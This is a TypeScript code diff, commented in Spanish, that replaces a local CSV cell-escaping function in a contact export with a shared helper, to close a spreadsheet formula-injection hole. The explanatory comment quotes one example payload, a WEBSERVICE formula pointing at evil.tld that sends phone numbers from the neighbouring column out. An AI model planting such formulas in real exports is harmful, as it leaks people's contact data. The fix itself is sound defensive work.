@@ -1,5 +1,5 @@
 import type { PoolClient } from 'pg';
-import { crearXlsx, type ValorCelda } from '@iaxti/core';
+import { celdaCsv, crearXlsx, type ValorCelda } from '@iaxti/core';
 import { degradarSinRomper } from '@iaxti/db';
 import { listCustomFields } from './campos';
 
@@ -28,18 +28,21 @@ const COLUMNAS_BASE = [
   'ultima_actividad',
 ] as const;
 
-function celda(valor: unknown): string {
-  if (valor === null || valor === undefined) return '""';
-  const texto =
-    valor instanceof Date
-      ? valor.toISOString()
-      : typeof valor === 'object'
-        ? JSON.stringify(valor)
-        : String(valor);
-  // Comillas dobladas y todo entre comillas: un texto con coma, salto de
-  // línea o comilla no puede correr las columnas.
-  return `"${texto.replace(/"/g, '""')}"`;
-}
+/**
+ * La celda sale de `@iaxti/core` y no de acá (#1170).
+ *
+ * Lo que evita: esta función doblaba las comillas y encerraba el valor, y
+ * encerrar entre comillas no detiene una fórmula —Excel las saca al importar
+ * y evalúa el `=` igual—. Desde #1170 el campo `nombre` de un contacto lo
+ * puede escribir un desconocido con el solo acto de mandar un WhatsApp (su
+ * nombre de perfil), y esta ruta sirve `text/csv` con BOM y
+ * `Content-Disposition: attachment`, o sea pensada para abrirse en una
+ * planilla. Un nombre de perfil `=WEBSERVICE("https://evil.tld/?x="&B2)` se
+ * evaluaba al abrir el archivo y se llevaba los teléfonos de la columna
+ * vecina. La regla ya existía en el paquete de exportación del titular; lo
+ * que faltaba era que fuera UNA.
+ */
+const celda = celdaCsv;
 
 /**
  * Un campo propio puede guardar cualquier cosa; la planilla solo entiende
